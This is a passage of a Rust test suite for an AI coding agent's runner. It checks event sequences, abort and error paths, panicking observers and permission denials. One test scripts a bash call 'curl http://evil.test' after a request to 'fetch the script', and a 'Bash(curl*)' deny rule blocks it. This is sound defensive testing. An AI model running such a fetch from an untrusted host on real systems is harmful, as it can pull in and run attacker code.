        fn on_event(&self, _event: &AgentEvent) {
            panic!("observer blew up");
        }
    }

    /// A model whose `completion` fails, to exercise the model-stage error path.
    #[derive(Clone, Default)]
    struct ErrModel;

    impl kuncode_core::completion::CompletionModel for ErrModel {
        type Response = Value;
        type Client = ();

        fn make(_client: &Self::Client, _model: impl Into<String>) -> Self {
            Self
        }

        async fn completion(
            &self,
            _request: CompletionRequest,
        ) -> Result<CompletionResponse<Self::Response>, CompletionError> {
            Err(CompletionError::ResponseError("boom".to_string()))
        }

        async fn stream(
            &self,
            _request: CompletionRequest,
        ) -> Result<CompletionStream, CompletionError> {
            unimplemented!("error model does not stream")
        }
    }

    /// A raw [`Tool`] whose `call` returns a harness-level [`ToolError`] — the
    /// `AgentError::Tool` path, distinct from a model-recoverable failure. A
    /// `Read` action so the gate lets it through to execution unprompted.
    struct BrokenTool {
        definition: ToolDefinition,
    }

    impl BrokenTool {
        fn new() -> Self {
            Self {
                definition: definition_for::<HangArgs>("broken", "Always errors internally"),
            }
        }
    }

    #[async_trait]
    impl Tool for BrokenTool {
        fn definition(&self) -> &ToolDefinition {
            &self.definition
        }

        fn permission(
            &self,
            _args: &Value,
            _ctx: &ToolContext,
        ) -> Result<PermissionRequest, ToolOutput> {
            Ok(PermissionRequest::new(
                "broken",
                PermissionAction::Read,
                None,
                "broken",
            ))
        }

        async fn call(&self, _args: Value, _ctx: &ToolContext) -> Result<ToolOutput, ToolError> {
            Err(ToolError::Internal("kaboom".to_string()))
        }
    }

    /// Stable label for an [`EventKind`], for asserting on the sequence shape.
    fn event_label(kind: &EventKind) -> &'static str {
        match kind {
            EventKind::ModelStart => "model_start",
            EventKind::Assistant { .. } => "assistant",
            EventKind::ToolStart { .. } => "tool_start",
            EventKind::ToolEnd { .. } => "tool_end",
            EventKind::Error { .. } => "error",
        }
    }

    /// The tool_call ids the transcript's tool_result messages answer, in order.
    fn tool_result_ids(session: &AgentSession) -> Vec<String> {
        session
            .messages()
            .iter()
            .filter_map(|message| match message {
                Message::User { content } => match content.first() {
                    UserContent::ToolResult(result) => Some(result.id.clone()),
                    _ => None,
                },
                _ => None,
            })
            .collect()
    }

    #[tokio::test]
    async fn emits_full_event_sequence_on_success() {
        let model = FakeModel::new([
            response(AssistantContent::tool_call(
                "call_1",
                "bash",
                serde_json::json!({ "cmd": "printf s01" }),
            )),
            response(AssistantContent::text("done")),
        ]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        let observer = Arc::new(CollectingObserver::default());
        let runner = AgentRunner::new(model, registry).with_observer(observer.clone());
        let mut session = AgentSession::new();

        runner
            .run_turn(&mut session, "inspect the workspace")
            .await
            .expect("agent run should complete");

        let events = observer.events();
        let kinds: Vec<_> = events.iter().map(|e| event_label(&e.kind)).collect();
        assert_eq!(
            kinds,
            vec![
                "model_start",
                "assistant",
                "tool_start",
                "tool_end",
                "model_start",
                "assistant",
            ],
        );

        // First assistant carries the tool call; the final one carries none.
        assert!(matches!(
            &events[1].kind,
            EventKind::Assistant { tool_calls, .. } if tool_calls == &["call_1"]
        ));
        assert!(matches!(
            &events[5].kind,
            EventKind::Assistant { tool_calls, .. } if tool_calls.is_empty()
        ));
        assert!(matches!(
            &events[3].kind,
            EventKind::ToolEnd {
                ok: true,
                error: None,
                ..
            }
        ));
        // Happy path: no terminal Error, every event owns a model call, and seq
        // is strictly monotonic from 0.
        assert!(
            !events
                .iter()
                .any(|e| matches!(e.kind, EventKind::Error { .. }))
        );
        assert!(events.iter().all(|e| e.iteration.is_some()));
        assert!(events.iter().enumerate().all(|(i, e)| e.seq == i as u64));
    }

    #[tokio::test]
    async fn abort_mirrors_tool_results_and_ends_with_cancelled_error() {
        let model = FakeModel::new([response_many(vec![
            AssistantContent::tool_call(
                "call_1",
                "bash",
                serde_json::json!({ "cmd": "printf one" }),
            ),
            AssistantContent::tool_call(
                "call_2",
                "bash",
                serde_json::json!({ "cmd": "printf two" }),
            ),
        ])]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        let observer = Arc::new(CollectingObserver::default());
        let runner = AgentRunner::new(model, registry)
            .with_approver(Arc::new(ScriptedApprover::new([ApprovalOutcome::Abort])))
            .with_observer(observer.clone());
        let mut session = AgentSession::new();

        let err = runner
            .run_turn(&mut session, "do two things")
            .await
            .expect_err("abort unwinds the whole turn");
        assert!(matches!(err, AgentError::Cancelled));

        let events = observer.events();
        // Mirror invariant: one ToolEnd per transcript tool_result, same ids.
        let tool_ends: Vec<_> = events
            .iter()
            .filter_map(|e| match &e.kind {
                EventKind::ToolEnd { tool_call_id, .. } => Some(tool_call_id.clone()),
                _ => None,
            })
            .collect();
        assert_eq!(tool_ends, vec!["call_1", "call_2"]);
        assert_eq!(tool_ends, tool_result_ids(&session));

        // Exactly one terminal Error, kind "cancelled", and it is last.
        let errors: Vec<_> = events
            .iter()
            .filter(|e| matches!(e.kind, EventKind::Error { .. }))
            .collect();
        assert_eq!(errors.len(), 1);
        assert!(matches!(
            &errors[0].kind,
            EventKind::Error { kind, .. } if kind == "cancelled"
        ));
        assert!(matches!(
            events.last().map(|e| &e.kind),
            Some(EventKind::Error { .. })
        ));
    }

    #[tokio::test]
    async fn completion_failure_closes_thinking_with_error() {
        let observer = Arc::new(CollectingObserver::default());
        let runner =
            AgentRunner::new(ErrModel, ToolRegistry::new()).with_observer(observer.clone());
        let mut session = AgentSession::new();

        let err = runner
            .run_turn(&mut session, "go")
            .await
            .expect_err("the model fails");
        assert!(matches!(err, AgentError::Completion(_)));

        let events = observer.events();
        let kinds: Vec<_> = events.iter().map(|e| event_label(&e.kind)).collect();
        // ModelStart's "thinking" state is closed by the Error, with no
        // intervening Assistant — exactly the finding-2 guarantee.
        assert_eq!(kinds, vec!["model_start", "error"]);
        assert!(matches!(
            &events[1].kind,
            EventKind::Error { kind, .. } if kind == "completion"
        ));
    }

    #[tokio::test]
    async fn harness_tool_error_is_honestly_ended_then_turn_errors() {
        let model = FakeModel::new([response_many(vec![
            AssistantContent::tool_call("call_1", "broken", serde_json::json!({})),
            AssistantContent::tool_call("call_2", "broken", serde_json::json!({})),
        ])]);
        let mut registry = ToolRegistry::new();
        registry.register(BrokenTool::new());
        let observer = Arc::new(CollectingObserver::default());
        let runner = AgentRunner::new(model, registry).with_observer(observer.clone());
        let mut session = AgentSession::new();

        let err = runner
            .run_turn(&mut session, "break it")
            .await
            .expect_err("a harness tool error unwinds the turn");
        assert!(matches!(err, AgentError::Tool { .. }));

        let events = observer.events();
        let tool_ends: Vec<_> = events
            .iter()
            .filter_map(|e| match &e.kind {
                EventKind::ToolEnd {
                    tool_call_id,
                    error,
                    ..
                } => Some((tool_call_id.clone(), error.as_ref().map(|f| f.kind.clone()))),
                _ => None,
            })
            .collect();
        // call_1 actually ran and failed → honest "tool_error"; call_2 never ran
        // → "cancelled". This is finding 1.
        assert_eq!(
            tool_ends,
            vec![
                ("call_1".to_string(), Some("tool_error".to_string())),
                ("call_2".to_string(), Some("cancelled".to_string())),
            ],
        );
        // The transcript result mirrors the ToolEnd's honest failure.
        assert!(tool_result_text(&session, 2).contains("tool_error"));

        let errors: Vec<_> = events
            .iter()
            .filter(|e| matches!(e.kind, EventKind::Error { .. }))
            .collect();
        assert_eq!(errors.len(), 1);
        assert!(matches!(
            &errors[0].kind,
            EventKind::Error { kind, .. } if kind == "tool"
        ));
    }

    #[tokio::test]
    async fn unknown_tool_emits_tool_end_without_tool_start() {
        let model = FakeModel::new([
            response(AssistantContent::tool_call(
                "call_1",
                "ghost",
                serde_json::json!({}),
            )),
            response(AssistantContent::text("ok")),
        ]);
        let observer = Arc::new(CollectingObserver::default());
        let runner = AgentRunner::new(model, ToolRegistry::new()).with_observer(observer.clone());
        let mut session = AgentSession::new();

        runner
            .run_turn(&mut session, "call a ghost")
            .await
            .expect("an unknown tool is model-recoverable");

        let events = observer.events();
        // The tool never resolved, so it gets a ToolEnd with no ToolStart.
        assert!(
            !events
                .iter()
                .any(|e| matches!(e.kind, EventKind::ToolStart { .. }))
        );
        let tool_ends: Vec<_> = events
            .iter()
            .filter(|e| matches!(e.kind, EventKind::ToolEnd { .. }))
            .collect();
        assert_eq!(tool_ends.len(), 1);
        assert!(matches!(
            &tool_ends[0].kind,
            EventKind::ToolEnd { ok: false, error: Some(f), .. } if f.kind == "unknown_tool"
        ));
    }

    #[tokio::test]
    async fn permission_denied_emits_failed_tool_end_after_start() {
        let model = FakeModel::new([
            response(AssistantContent::tool_call(
                "call_1",
                "bash",
                serde_json::json!({ "cmd": "curl http://evil.test" }),
            )),
            response(AssistantContent::text("understood")),
        ]);
        let mut registry = ToolRegistry::new();
        registry.register(bash().await);
        let mut policy = PermissionPolicy::new();
        policy
            .deny
            .extend(parse_rule("Bash(curl*)", RuleOrigin::ProjectSettings).unwrap());
        let observer = Arc::new(CollectingObserver::default());
        let runner = AgentRunner::new(model, registry)
            .with_policy(policy)
            .with_observer(observer.clone());
        let mut session = AgentSession::new();

        runner
            .run_turn(&mut session, "fetch the script")
            .await
            .expect("a denial is model-recoverable");

        let events = observer.events();
        // The request was computed, so ToolStart fires before the deny verdict.
        assert!(events.iter().any(|e| matches!(
            &e.kind,
            EventKind::ToolStart { tool_call_id, .. } if tool_call_id == "call_1"
        )));
        let tool_ends: Vec<_> = events
            .iter()
            .filter_map(|e| match &e.kind {
                EventKind::ToolEnd { error, .. } => Some(error.clone()),
                _ => None,
            })
            .collect();
        assert_eq!(tool_ends.len(), 1);
        assert!(matches!(&tool_ends[0], Some(f) if f.kind == "permission_denied"));
    }

    #[tokio::test]
    async fn composite_observer_isolates_a_panicking_observer() {
        let model = FakeModel::new([response(AssistantContent::text("done"))]);
        let collecting = Arc::new(CollectingObserver::default());
        let composite = CompositeObserver(vec![
            Arc::new(PanicObserver) as Arc<dyn AgentObserver>,
            collecting.clone(),
        ]);
        let runner =
            AgentRunner::new(model, ToolRegistry::new()).with_observer(Arc::new(composite));
        let mut session = AgentSession::new();

        let turn = runner
            .run_turn(&mut session, "go")
            .await
            .expect("a panicking observer must not unwind the turn");
        assert_eq!(turn.final_text(&session), "done");

        // The healthy observer still received the full stream.
        let kinds: Vec<_> = collecting
            .events()
            .iter()
            .map(|e| event_label(&e.kind))
            .collect();
        assert_eq!(kinds, vec!["model_start", "assistant"]);
    }

    #[tokio::test]
    async fn bare_panicking_observer_does_not_unwind_the_runner() {
        // A bare (non-composite) observer has no isolation of its own, so a
        // surviving turn proves `emit` itself swallows the panic — a rendering
        // frontend must never be able to crash the agent loop.
        let model = FakeModel::new([response(AssistantContent::text("done"))]);
        let runner =
            AgentRunner::new(model, ToolRegistry::new()).with_observer(Arc::new(PanicObserver));
        let mut session = AgentSession::new();

        let turn = runner
            .run_turn(&mut session, "go")
            .await
            .expect("a panicking bare observer must not unwind the turn");
        assert_eq!(turn.final_text(&session), "done");
    }

    #[tokio::test]
    async fn pre_iteration_error_carries_no_iteration() {
        let observer = Arc::new(CollectingObserver::default());
        let runner = AgentRunner::with_config(
            FakeModel::default(),
            ToolRegistry::new(),
            AgentConfig {
                max_iterations: 0,
                ..AgentConfig::default()
            },
        )
        .with_observer(observer.clone());
        let mut session = AgentSession::new();

        let err = runner
            .run_turn(&mut session, "go")
            .await
            .expect_err("a zero iteration budget cannot complete");
        assert!(matches!(err, AgentError::MaxIterations { .. }));

        let events = observer.events();
        // The model was never called, so the only event is the terminal Error,
        // which has no owning model call — `iteration` is `None`, not `Some(0)`.
        assert_eq!(events.len(), 1);
        assert_eq!(events[0].iteration, None);
        assert!(matches!(
            &events[0].kind,
            EventKind::Error { kind, .. } if kind == "max_iterations"
        ));
    }

    #[tokio::test]
    async fn empty_transcript_error_carries_no_iteration() {
        let observer = Arc::new(CollectingObserver::default());
        let runner = AgentRunner::new(FakeModel::default(), ToolRegistry::new())
            .with_observer(observer.clone());
        let mut session = AgentSession::new();

        let err = runner
            .continue_session(&mut session)
            .await
            .expect_err("an empty transcript is invalid");
        assert!(matches!(err, AgentError::EmptyTranscript));

        let events = observer.events();
        assert_eq!(events.len(), 1);
        assert_eq!(events[0].iteration, None);
        assert!(matches!(
            &events[0].kind,
            EventKind::Error { kind, .. } if kind == "empty_transcript"
        ));
    }
}
